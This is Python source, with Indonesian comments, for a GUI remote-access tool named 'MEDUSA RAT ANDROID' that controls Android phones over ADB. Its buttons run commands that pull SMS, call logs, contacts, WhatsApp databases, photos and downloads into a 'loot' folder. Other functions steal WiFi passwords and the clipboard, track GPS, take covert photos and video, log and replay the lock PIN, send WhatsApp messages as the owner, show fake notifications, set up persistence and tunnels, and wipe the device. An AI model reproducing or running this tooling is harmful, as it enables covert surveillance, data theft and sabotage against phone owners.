import customtkinter
import tkinter
import subprocess
import threading
import os
import time 
import socket
from concurrent.futures import ThreadPoolExecutor
import json
import webbrowser
import re
import importlib
from datetime import datetime
from PIL import Image


# --- WELCOME SCREEN ---
class WelcomeScreen(customtkinter.CTk):
    """
    Layar pembuka sederhana yang menampilkan pesan selamat datang.
    Didesain untuk ditampilkan oleh aplikasi utama saat startup.
    """
    def __init__(self):
        super().__init__()

        self.title("Welcome")
        self.overrideredirect(True)  # Menghilangkan dekorasi jendela (title bar, dll.)
        self.configure(fg_color="#1a1a1a")
        self.attributes("-topmost", True) # Menjaga agar tetap di atas

        # --- Pusatkan jendela di layar ---
        window_width = 500
        window_height = 250
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        center_x = int(screen_width / 2 - window_width / 2)
        center_y = int(screen_height / 2 - window_height / 2)
        self.geometry(f'{window_width}x{window_height}+{center_x}+{center_y}')

        # --- Layout ---
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        main_frame = customtkinter.CTkFrame(self, fg_color="transparent", corner_radius=10)
        main_frame.grid(row=0, column=0, sticky="nsew", padx=1, pady=1)
        main_frame.configure(border_color="#FF0000", border_width=2)
        main_frame.grid_rowconfigure((0, 2), weight=1)
        main_frame.grid_columnconfigure(0, weight=1)

        logo_path = os.path.join(BASE_DIR, "icon_aplikasi.png")
        self.logo_image = None
        if os.path.exists(logo_path):
            self.logo_image = tkinter.PhotoImage(file=logo_path)
            if self.logo_image.width() > 110:
                self.logo_image = self.logo_image.subsample(max(1, self.logo_image.width() // 110))

        self.logo_label = tkinter.Label(
            main_frame,
            image=self.logo_image,
            text="",
            width=110,
            height=110,
            bg="#1a1a1a",
            bd=0,
            highlightthickness=0
        )
        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 6), sticky="n")

        # --- Pesan Selamat Datang ---
        welcome_label = customtkinter.CTkLabel(main_frame, text="Welcome to MEDUSA RAT ANDROID", font=customtkinter.CTkFont(size=28, weight="bold"), text_color="#FF0000")
        welcome_label.grid(row=1, column=0, padx=20, pady=(10, 10), sticky="s")

        # --- Teks Loading ---
        loading_label = customtkinter.CTkLabel(main_frame, text="Initializing components...", font=customtkinter.CTkFont(size=14), text_color="gray80")
        loading_label.grid(row=2, column=0, padx=20, pady=10)
        
        # --- Progress Bar ---
        progressbar = customtkinter.CTkProgressBar(main_frame, width=300, mode="indeterminate", progress_color="#FF0000")
        progressbar.grid(row=2, column=0, padx=20, pady=(10, 20), sticky="n")
        progressbar.start()

    def close_with_fade(self, on_close_callback):
        self.on_close_callback = on_close_callback
        self._fade_out()

    def _fade_out(self):
        try:
            current_alpha = self.attributes("-alpha")
            if current_alpha > 0.1:
                new_alpha = current_alpha - 0.1
                self.attributes("-alpha", new_alpha)
                self.after(30, self._fade_out)
            else:
                self.destroy()
                if self.on_close_callback:
                    self.on_close_callback()
        except tkinter.TclError:
            pass

# --- KONFIGURASI ---
customtkinter.set_appearance_mode("Dark") # Paksa mode gelap

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOOT_DIR = os.path.join(BASE_DIR, "ADB_LOOT")
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
os.makedirs(LOOT_DIR, exist_ok=True)

# --- TEMA HACKER ---
HACKER_THEME = {
    "button_color": "#8B0000",      # Merah Tua
    "button_hover": "#FF0000",      # Merah Terang
    "text_green": "#00FF00",        # Hijau Neon
    "border_red": "#FF0000"
}

# --- REUSABLE CUSTOM DIALOGS ---
class PairingDialog(customtkinter.CTkToplevel):
    def __init__(self, parent, title="Manual Pairing", theme=None):
        super().__init__(parent)

        self.theme = theme if theme else {}
        self._inputs = {}

        self.title(title)
        self.configure(fg_color="#1a1a1a")
        self.attributes("-topmost", True)

        # Center window
        dialog_width = 400
        dialog_height = 320
        parent_x = parent.winfo_x()
        parent_y = parent.winfo_y()
        parent_width = parent.winfo_width()
        parent_height = parent.winfo_height()
        center_x = parent_x + int(parent_width/2 - dialog_width/2)
        center_y = parent_y + int(parent_height/2 - dialog_height/2)
        self.geometry(f"{dialog_width}x{dialog_height}+{center_x}+{center_y}")

        self.transient(parent)
        self.grab_set()

        self.grid_columnconfigure(1, weight=1)
        entry_style = {"border_color": self.theme.get("border_red", "#FF0000"), "fg_color": "black", "text_color": self.theme.get("text_green", "#00FF00")}
        label_style = {"text_color": "gray80"}

        customtkinter.CTkLabel(self, text="IP Target:", **label_style).grid(row=0, column=0, padx=(20, 5), pady=(20, 5), sticky="w")
        self.ip_entry = customtkinter.CTkEntry(self, **entry_style)
        self.ip_entry.grid(row=0, column=1, padx=(0, 20), pady=(20, 5), sticky="ew")

        customtkinter.CTkLabel(self, text="Pairing Port:", **label_style).grid(row=1, column=0, padx=(20, 5), pady=5, sticky="w")
        self.pport_entry = customtkinter.CTkEntry(self, **entry_style)
        self.pport_entry.grid(row=1, column=1, padx=(0, 20), pady=5, sticky="ew")

        customtkinter.CTkLabel(self, text="Pairing Code:", **label_style).grid(row=2, column=0, padx=(20, 5), pady=5, sticky="w")
        self.pcode_entry = customtkinter.CTkEntry(self, **entry_style)
        self.pcode_entry.grid(row=2, column=1, padx=(0, 20), pady=5, sticky="ew")

        customtkinter.CTkLabel(self, text="Debug Port:", **label_style).grid(row=3, column=0, padx=(20, 5), pady=5, sticky="w")
        self.dport_entry = customtkinter.CTkEntry(self, **entry_style)
        self.dport_entry.grid(row=3, column=1, padx=(0, 20), pady=5, sticky="ew")
        
        self.ip_entry.focus()

        customtkinter.CTkButton(self, text="Pair & Connect", command=self._on_ok, fg_color=self.theme.get("button_color", "#8B0000"), hover_color=self.theme.get("button_hover", "#FF0000")).grid(row=4, column=0, columnspan=2, padx=20, pady=(20, 20), sticky="ew")
        self.protocol("WM_DELETE_WINDOW", self._on_cancel)

    def _on_ok(self):
        self._inputs = {"ip": self.ip_entry.get(), "pport": self.pport_entry.get(), "pcode": self.pcode_entry.get(), "dport": self.dport_entry.get()}
        self.destroy()

    def _on_cancel(self):
        self._inputs = None
        self.destroy()

    def get_inputs(self):
        self.master.wait_window(self)
        return self._inputs

class CustomInputDialog(customtkinter.CTkToplevel):
    def __init__(self, parent, title="Input", text="Enter value:", theme=None):
        super().__init__(parent)

        self.theme = theme if theme else {}
        self._input_value = ""

        self.title(title)
        self.configure(fg_color="#1a1a1a")
        self.attributes("-topmost", True)

        # Center window
        dialog_width = 400
        dialog_height = 180
        parent_x = parent.winfo_x()
        parent_y = parent.winfo_y()
        parent_width = parent.winfo_width()
        parent_height = parent.winfo_height()
        center_x = parent_x + int(parent_width/2 - dialog_width/2)
        center_y = parent_y + int(parent_height/2 - dialog_height/2)
        self.geometry(f"{dialog_width}x{dialog_height}+{center_x}+{center_y}")

        self.transient(parent)
        self.grab_set()

        self.label = customtkinter.CTkLabel(self, text=text, text_color=self.theme.get("text_green", "#00FF00"), wraplength=380)
        self.label.pack(padx=20, pady=(20, 10))

        self.entry = customtkinter.CTkEntry(self, width=250, border_color=self.theme.get("border_red", "#FF0000"), fg_color="black", text_color=self.theme.get("text_green", "#00FF00"))
        self.entry.pack(padx=20, pady=5)
        self.entry.focus()

        self.button = customtkinter.CTkButton(self, text="OK", command=self._on_ok, fg_color=self.theme.get("button_color", "#8B0000"), hover_color=self.theme.get("button_hover", "#FF0000"))
        self.button.pack(padx=20, pady=(10, 20))

        self.bind("<Return>", lambda event: self._on_ok())
        self.protocol("WM_DELETE_WINDOW", self._on_cancel)

    def _on_ok(self):
        self._input_value = self.entry.get()
        self.destroy()

    def _on_cancel(self):
        self._input_value = None
        self.destroy()

    def get_input(self):
        self.master.wait_window(self)
        return self._input_value

class WhatsAppDialog(customtkinter.CTkToplevel):
    def __init__(self, parent, title="Kirim Pesan WhatsApp", theme=None):
        super().__init__(parent)

        self.theme = theme if theme else {}
        self._inputs = {}

        self.title(title)
        self.configure(fg_color="#1a1a1a")
        self.attributes("-topmost", True)

        dialog_width, dialog_height = 400, 250
        parent_x, parent_y, parent_width, parent_height = parent.winfo_x(), parent.winfo_y(), parent.winfo_width(), parent.winfo_height()
        center_x = parent_x + int(parent_width/2 - dialog_width/2)
        center_y = parent_y + int(parent_height/2 - dialog_height/2)
        self.geometry(f"{dialog_width}x{dialog_height}+{center_x}+{center_y}")

        self.transient(parent)
        self.grab_set()

        self.grid_columnconfigure(1, weight=1)
        entry_style = {"border_color": self.theme.get("border_red", "#FF0000"), "fg_color": "black", "text_color": self.theme.get("text_green", "#00FF00")}
        label_style = {"text_color": "gray80"}

        customtkinter.CTkLabel(self, text="Nomor Target:", **label_style).grid(row=0, column=0, padx=(20, 5), pady=(20, 5), sticky="w")
        self.nomor_entry = customtkinter.CTkEntry(self, placeholder_text="cth: 628123456789", **entry_style)
        self.nomor_entry.grid(row=0, column=1, padx=(0, 20), pady=(20, 5), sticky="ew")

        customtkinter.CTkLabel(self, text="Pesan:", **label_style).grid(row=1, column=0, padx=(20, 5), pady=5, sticky="w")
        self.pesan_entry = customtkinter.CTkEntry(self, **entry_style)
        self.pesan_entry.grid(row=1, column=1, padx=(0, 20), pady=5, sticky="ew")
        self.nomor_entry.focus()

        customtkinter.CTkButton(self, text="Kirim", command=self._on_ok, fg_color=self.theme.get("button_color", "#8B0000"), hover_color=self.theme.get("button_hover", "#FF0000")).grid(row=2, column=0, columnspan=2, padx=20, pady=(20, 20), sticky="ew")

    def _on_ok(self):
        self._inputs = {"nomor": self.nomor_entry.get(), "pesan": self.pesan_entry.get()}
        self.destroy()

    def get_inputs(self):
        self.master.wait_window(self)
        return self._inputs


class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        self.cloudflared_process = None
        self.active_device_serial = None
        self.connected_devices = {} # Dictionary untuk menyimpan info perangkat
        self.config = self.load_config()
        self.is_spamming_back = False
        self.spam_back_thread = None
        self.is_flashlight_on = False
        self.flashlight_button_widget = None
        self.loading_busy = False
        self.loading_animation_id = None
        self.title("MEDUSA RAT ANDROID v1.0")

        self.loading_popup = customtkinter.CTkToplevel(self)
        self.loading_popup.withdraw()
        self.loading_popup.attributes("-topmost", True)
        self.loading_popup.configure(fg_color="#111111")
        self.loading_popup.overrideredirect(True)
        self.loading_popup_label = customtkinter.CTkLabel(self.loading_popup, text="Eksekusi Perintah...", text_color=HACKER_THEME["text_green"], font=customtkinter.CTkFont(size=14, weight="bold"))
        self.loading_popup_label.pack(padx=18, pady=(12, 6))
        self.loading_progressbar = customtkinter.CTkProgressBar(self.loading_popup, width=260, height=12, mode="indeterminate", fg_color="#2b2b2b", progress_color=HACKER_THEME["border_red"])
        self.loading_progressbar.pack(padx=18, pady=(0, 12))

        # --- Responsive fullscreen window setup ---
        self.minsize(1100, 700)
        # self.state("zoomed") # Dihapus agar tidak fullscreen
        self.bind("<Configure>", self._on_window_resize)

        # --- Pusatkan jendela di layar ---
        window_width = 1280
        window_height = 720
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        center_x = int(screen_width / 2 - window_width / 2)
        center_y = int(screen_height / 2 - window_height / 2)
        self.geometry(f'{window_width}x{window_height}+{center_x}+{center_y}')

        self.protocol("WM_DELETE_WINDOW", self.on_closing)

        # --- LAYOUT UTAMA ---
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- FRAME KIRI (SIDEBAR) ---
        self.sidebar_frame = customtkinter.CTkFrame(self, width=280, corner_radius=0, fg_color="#1a1a1a")
        self.sidebar_frame.grid(row=0, column=0, rowspan=4, sticky="nsew")
        self.sidebar_frame.grid_columnconfigure(0, weight=1)
        self.sidebar_frame.grid_rowconfigure(5, weight=1) # Memberi ruang untuk info perangkat

        # --- Logo Aplikasi ---
        try:
            image_path = os.path.join(BASE_DIR, "icon_aplikasi.png")
            self.app_logo_image = customtkinter.CTkImage(Image.open(image_path), size=(80, 80))
            self.app_logo_label = customtkinter.CTkLabel(self.sidebar_frame, image=self.app_logo_image, text="")
            self.app_logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))
        except (FileNotFoundError, Exception) as e:
            # Fallback jika gambar tidak ditemukan
            self.app_logo_label = customtkinter.CTkLabel(self.sidebar_frame, text="[LOGO]", font=customtkinter.CTkFont(size=16, weight="bold"))
            self.app_logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))
            print(f"Info: Tidak dapat memuat logo 'icon_aplikasi.png'. Pastikan file ada di direktori yang sama. Error: {e}")

        self.logo_label = customtkinter.CTkLabel(self.sidebar_frame, text="MEDUSA RAT ANDROID", font=customtkinter.CTkFont(size=20, weight="bold"), text_color=HACKER_THEME["border_red"])
        self.logo_label.grid(row=1, column=0, padx=20, pady=(0, 20))

        self.scan_network_button = customtkinter.CTkButton(self.sidebar_frame, text="Scan Jaringan (WiFi)", command=self.scan_network, fg_color="#008080", hover_color="#00CED1")
        self.scan_network_button.grid(row=2, column=0, padx=20, pady=10)

        self.device_panel = customtkinter.CTkFrame(self.sidebar_frame, fg_color="transparent")
        self.device_panel.grid(row=3, column=0, padx=20, pady=10, sticky="ew")
        self.device_panel.grid_columnconfigure(0, weight=1)

        self.status_label = customtkinter.CTkLabel(self.device_panel, text="Pilih Perangkat Aktif:", anchor="center", justify="center", text_color="gray70")
        self.status_label.grid(row=0, column=0, pady=(0, 8), sticky="ew")
        
        self.device_selector_var = customtkinter.StringVar(value="[ Tidak ada perangkat ]")
        self.device_selector_menu = customtkinter.CTkOptionMenu(self.device_panel, variable=self.device_selector_var, command=self.on_device_select, values=["[ Tidak ada perangkat ]"])
        self.device_selector_menu.grid(row=1, column=0, pady=(0, 8), sticky="ew")
        
        self.device_info_label = customtkinter.CTkLabel(self.device_panel, text="Detail:\n-", anchor="center", justify="center", wraplength=220, text_color="gray70")
        self.device_info_label.grid(row=2, column=0, sticky="ew")

        self.open_loot_button = customtkinter.CTkButton(self.sidebar_frame, text="Open ADB_LOOT", command=self.open_loot_folder, fg_color="#006400", hover_color="#228B22")
        self.open_loot_button.grid(row=6, column=0, padx=20, pady=10)

        self.manual_pair_button = customtkinter.CTkButton(self.sidebar_frame, text="Manual Pairing", command=self.manual_pairing, fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
        self.manual_pair_button.grid(row=7, column=0, padx=20, pady=10)

        self.connect_ip_button = customtkinter.CTkButton(self.sidebar_frame, text="Connect to IP (Direct)", command=self.connect_to_ip, fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
        self.connect_ip_button.grid(row=8, column=0, padx=20, pady=10)

        self.connect_button = customtkinter.CTkButton(self.sidebar_frame, text="Switch to TCP/IP (USB)", command=self.switch_to_tcp, fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
        self.connect_button.grid(row=9, column=0, padx=20, pady=10)

        self.flask_connect_button = customtkinter.CTkButton(self.sidebar_frame, text="Connect via Flask Relay", command=self.connect_via_flask, fg_color="#1E90FF", hover_color="#4169E1")
        self.flask_connect_button.grid(row=10, column=0, padx=20, pady=10)

        self.auto_tunnel_button = customtkinter.CTkButton(self.sidebar_frame, text="Auto-Create Tunnel (CF)", command=self.auto_create_tunnel, fg_color="#FFD700", text_color="black", hover_color="#FFA500")
        self.auto_tunnel_button.grid(row=11, column=0, padx=20, pady=10)

        self.activate_server_button = customtkinter.CTkButton(self.sidebar_frame, text="Aktifkan Server Tunnel", command=self.activate_tunnel_server, fg_color="#4B0082", hover_color="#8A2BE2")
        self.activate_server_button.grid(row=12, column=0, padx=20, pady=10)

        # --- FRAME KANAN (KONTEN) ---
        self.main_frame = customtkinter.CTkFrame(self, corner_radius=10)
        self.main_frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure(1, weight=1)

        self.tabview = customtkinter.CTkTabview(self.main_frame, fg_color="#1c1c1c",
                                                segmented_button_selected_color=HACKER_THEME["button_hover"],
                                                segmented_button_unselected_color="#1c1c1c",
                                                segmented_button_selected_hover_color=HACKER_THEME["button_hover"])
        self.tabview.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        self.tabview.add("Intel & Extraction")
        self.tabview.add("Manipulation")
        self.tabview.add("Camera & Logger")
        self.tabview.add("Multimedia")
        self.tabview.add("System & Power")

        # --- Style untuk tombol di dalam tab ---
        tab_button_style = {"fg_color": HACKER_THEME["button_color"], "hover_color": HACKER_THEME["button_hover"]}

        # --- TAB: INTEL & EXTRACTION ---
        intel_tab = self.tabview.tab("Intel & Extraction")
        intel_tab.grid_columnconfigure((0, 1), weight=1)
        customtkinter.CTkButton(intel_tab, text="1. Sedot SMS", command=lambda: self.run_command_in_thread('shell content query --uri content://sms/', save_to_file="sms.txt"), **tab_button_style).grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="2. Sedot Call Log", command=lambda: self.run_command_in_thread('shell content query --uri content://call_log/calls', save_to_file="calls.txt"), **tab_button_style).grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="3. Sedot Kontak", command=lambda: self.run_command_in_thread('shell content query --uri content://com.android.contacts/data', save_to_file="kontak.txt"), **tab_button_style).grid(row=2, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="5. Daftar Apps", command=lambda: self.run_command_in_thread('shell pm list packages -f', save_to_file="apps_list.txt"), **tab_button_style).grid(row=3, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="6. DB WhatsApp (Root/SD)", command=lambda: self.run_command_in_thread('pull /sdcard/WhatsApp/Databases/ "WA_DB"'), **tab_button_style).grid(row=4, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="12. Curi Clipboard", command=self.get_clipboard, **tab_button_style).grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="13. Info Baterai Detail", command=lambda: self.run_command_in_thread('shell dumpsys battery', save_to_file="battery_detail.txt"), **tab_button_style).grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="14. Lokasi Maps (Lat,Long)", command=self.open_maps_location, **tab_button_style).grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="Get WiFi Passwords (Root)", command=self.get_wifi_passwords, **tab_button_style).grid(row=3, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(intel_tab, text="Lacak Lokasi GPS", command=self.track_location, fg_color="#008080", hover_color="#00CED1").grid(row=4, column=1, padx=5, pady=5, sticky="ew")

        # --- TAB: MANIPULATION ---
        manip_tab = self.tabview.tab("Manipulation")
        manip_tab.grid_columnconfigure((0, 1), weight=1)
        customtkinter.CTkButton(manip_tab, text="15. Paksa Buka WA", command=lambda: self.run_command_in_thread('shell monkey -p com.whatsapp 1'), **tab_button_style).grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(manip_tab, text="16. Ketik Pesan WA", command=self.send_whatsapp_message, **tab_button_style).grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(manip_tab, text="21. Buka Link Browser", command=self.open_url, **tab_button_style).grid(row=2, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(manip_tab, text="24. Putar Musik (URL)", command=self.play_music_from_url, **tab_button_style).grid(row=3, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(manip_tab, text="27. Kirim Pesan Toast", command=self.send_toast, **tab_button_style).grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(manip_tab, text="28. Getarkan HP (5s)", command=self.vibrate_device, **tab_button_style).grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(manip_tab, text="29. Paksa Nonton YT (ID)", command=self.open_youtube_video, **tab_button_style).grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(manip_tab, text="45. Kirim Notif Palsu", command=self.send_fake_notification, **tab_button_style).grid(row=3, column=1, padx=5, pady=5, sticky="ew")

        # --- TAB: CAMERA & LOGGER ---
        cam_tab = self.tabview.tab("Camera & Logger")
        cam_tab.grid_columnconfigure((0, 1), weight=1)
        customtkinter.CTkButton(cam_tab, text="c1. Foto Kamera Depan", command=self.take_photo_front, **tab_button_style).grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(cam_tab, text="c2. Foto Kamera Belakang", command=self.take_photo_rear, **tab_button_style).grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(cam_tab, text="c3. Rekam Video Depan", command=self.record_video_front, **tab_button_style).grid(row=2, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(cam_tab, text="c4. Rekam Video Belakang", command=self.record_video_rear, **tab_button_style).grid(row=3, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(cam_tab, text="Buka Kamera Depan", command=lambda: self.run_command_in_thread('shell am start -a android.media.action.STILL_IMAGE_CAMERA --ei android.intent.extras.CAMERA_FACING 1'), **tab_button_style).grid(row=4, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(cam_tab, text="Buka Kamera Belakang", command=lambda: self.run_command_in_thread('shell am start -a android.media.action.STILL_IMAGE_CAMERA --ei android.intent.extras.CAMERA_FACING 0'), **tab_button_style).grid(row=5, column=0, padx=5, pady=5, sticky="ew")

        customtkinter.CTkButton(cam_tab, text="p1. 🔴 Rekam PIN (Logger)", command=self.record_pin, **tab_button_style).grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(cam_tab, text="p2. 🟢 Replay PIN (Bypass)", command=self.replay_pin, **tab_button_style).grid(row=1, column=1, padx=5, pady=5, sticky="ew")

        # --- TAB: MULTIMEDIA & SYSTEM TORTURE ---
        media_tab = self.tabview.tab("Multimedia")
        media_tab.grid_columnconfigure((0, 1), weight=1)
        customtkinter.CTkButton(media_tab, text="25. Screenshot", command=self.take_screenshot, **tab_button_style).grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="26. ScreenRecord", command=self.take_screenrecord, **tab_button_style).grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="30. Sedot Galeri (DCIM)", command=lambda: self.run_command_in_thread('pull /sdcard/DCIM/ "Gallery"'), **tab_button_style).grid(row=2, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="31. Sedot Foto Kamera", command=lambda: self.run_command_in_thread('pull /sdcard/DCIM/Camera/ "Photos"'), **tab_button_style).grid(row=3, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="32. Sedot Video Kamera", command=lambda: self.run_command_in_thread('pull /sdcard/DCIM/Camera/ "Videos"'), **tab_button_style).grid(row=4, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="33. Sedot Download", command=lambda: self.run_command_in_thread('pull /sdcard/Download/ "Downloads"'), **tab_button_style).grid(row=5, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="35. Mirror Scrcpy", command=self.mirror_scrcpy, **tab_button_style).grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="37. Injeksi Keyboard", command=self.type_text, **tab_button_style).grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="40. Ganti Wallpaper", command=self.change_wallpaper, **tab_button_style).grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(media_tab, text="42. 👻 Kirim & Putar MP3", command=self.push_and_play_mp3, **tab_button_style).grid(row=3, column=1, padx=5, pady=5, sticky="ew")

        # --- TAB: SYSTEM & POWER ---
        sys_tab = self.tabview.tab("System & Power")
        sys_tab.grid_columnconfigure((0, 1, 2), weight=1)
        customtkinter.CTkButton(sys_tab, text="41. 🔊 Mainkan Alarm (Max)", command=self.play_alarm, **tab_button_style).grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="43. 🔇 Stop Semua Suara", command=lambda: self.run_command_in_thread('shell input keyevent 127'), **tab_button_style).grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        self.spam_back_button_widget = customtkinter.CTkButton(sys_tab, text="Spam Tombol Back", command=self.toggle_spam_back, **tab_button_style)
        self.spam_back_button_widget.grid(row=2, column=0, padx=5, pady=5, sticky="ew")
        self.flashlight_button_widget = customtkinter.CTkButton(sys_tab, text="🔦 Senter", command=self.toggle_flashlight, **tab_button_style)
        self.flashlight_button_widget.grid(row=3, column=0, padx=5, pady=5, sticky="ew")
        
        customtkinter.CTkButton(sys_tab, text="Nyalakan Layar", command=lambda: self.run_command_in_thread('shell input keyevent 224'), **tab_button_style).grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="Matikan Layar", command=lambda: self.run_command_in_thread('shell input keyevent 26'), **tab_button_style).grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="Buka Kunci Layar", command=lambda: self.run_command_in_thread('shell input keyevent 82'), **tab_button_style).grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="Force Stop App", command=self.force_stop_app, **tab_button_style).grid(row=3, column=1, padx=5, pady=5, sticky="ew")

        customtkinter.CTkButton(sys_tab, text="50. Power Off", fg_color="#FF0000", hover_color="#b30000", command=self.power_off).grid(row=0, column=2, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="51. Reboot", command=lambda: self.run_command_in_thread('reboot'), **tab_button_style).grid(row=1, column=2, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="Install APK", command=self.install_apk, **tab_button_style).grid(row=2, column=2, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="Uninstall App", command=self.uninstall_apk, **tab_button_style).grid(row=3, column=2, padx=5, pady=5, sticky="ew")

        # --- Fitur Persistensi ---
        customtkinter.CTkButton(sys_tab, text="Enable Persistent ADB (Root)", command=self.enable_persistent_adb, **tab_button_style).grid(row=4, column=0, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="Disable Persistent ADB (Root)", command=self.disable_persistent_adb, **tab_button_style).grid(row=4, column=1, padx=5, pady=5, sticky="ew")
        customtkinter.CTkButton(sys_tab, text="Lupakan Kunci Persisten", command=self.forget_persistent_adb, **tab_button_style).grid(row=4, column=2, padx=5, pady=5, sticky="ew")

        customtkinter.CTkButton(sys_tab, text="54. WIPE ALL DATA", fg_color="#FF0000", hover_color="#b30000", text_color_disabled="#9B0000", command=self.wipe_data).grid(row=5, column=0, columnspan=3, padx=5, pady=(10,5), sticky="ew")

        # --- OUTPUT/LOG TEXTBOX ---
        self.log_textbox = customtkinter.CTkTextbox(self, height=150, fg_color="black", text_color=HACKER_THEME["text_green"], border_color=HACKER_THEME["border_red"], border_width=1)
        self.log_textbox.grid(row=1, column=1, padx=10, pady=(0, 10), sticky="nsew") 
        self.log_textbox.insert("0.0", "Selamat datang di MEDUSA RAT ANDROID GUI!\n")

        # --- PANEL ADB_LOOT EXPLORER (muncul hanya saat tombol sidebar ditekan) ---
        self.loot_frame = customtkinter.CTkFrame(self.main_frame, corner_radius=10, fg_color="#111111")
        self.loot_frame.grid(row=2, column=0, padx=10, pady=(0, 10), sticky="nsew")
        self.loot_frame.grid_columnconfigure(0, weight=1)
        self.loot_frame.grid_columnconfigure(1, weight=1)
        self.loot_frame.grid_rowconfigure(1, weight=1)
        self.loot_frame.grid_remove()

        self.loot_title = customtkinter.CTkLabel(self.loot_frame, text="ADB_LOOT Explorer", text_color=HACKER_THEME["text_green"], font=customtkinter.CTkFont(size=14, weight="bold"))
        self.loot_title.grid(row=0, column=0, columnspan=2, padx=10, pady=(10, 5), sticky="w")

        self.refresh_loot_button = customtkinter.CTkButton(self.loot_frame, text="Refresh ADB_LOOT", command=self.refresh_loot_panel, fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
        self.refresh_loot_button.grid(row=0, column=1, padx=(0, 10), pady=(10, 5), sticky="e")

        self.loot_file_paths = []
        self.loot_listbox = tkinter.Listbox(self.loot_frame, bg="#0a0a0a", fg=HACKER_THEME["text_green"], selectbackground="#8B0000", selectforeground="white", borderwidth=0, highlightthickness=0, relief="flat")
        self.loot_listbox.grid(row=1, column=0, padx=(10, 5), pady=(0, 10), sticky="nsew")
        self.loot_listbox.bind("<<ListboxSelect>>", self.on_loot_file_select)
        self.loot_listbox.bind("<Double-Button-1>", lambda event: self.open_selected_loot_file())

        self.loot_list_scrollbar = tkinter.Scrollbar(self.loot_frame, orient="vertical", command=self.loot_listbox.yview)
        self.loot_list_scrollbar.grid(row=1, column=0, sticky="nse", padx=(0, 5), pady=(0, 10))
        self.loot_listbox.configure(yscrollcommand=self.loot_list_scrollbar.set)

        self.loot_preview = customtkinter.CTkTextbox(self.loot_frame, height=220, fg_color="black", text_color=HACKER_THEME["text_green"], border_color=HACKER_THEME["border_red"], border_width=1)
        self.loot_preview.grid(row=1, column=1, padx=(5, 10), pady=(0, 10), sticky="nsew")
        self.loot_preview.insert("0.0", "Pilih file dari daftar untuk melihat pratinjau konten.\n")

        self.open_loot_file_button = customtkinter.CTkButton(self.loot_frame, text="Buka Gambar/Video", command=self.open_selected_loot_file, fg_color="#008080", hover_color="#00CED1")
        self.open_loot_file_button.grid(row=2, column=1, padx=(5, 10), pady=(0, 10), sticky="e")

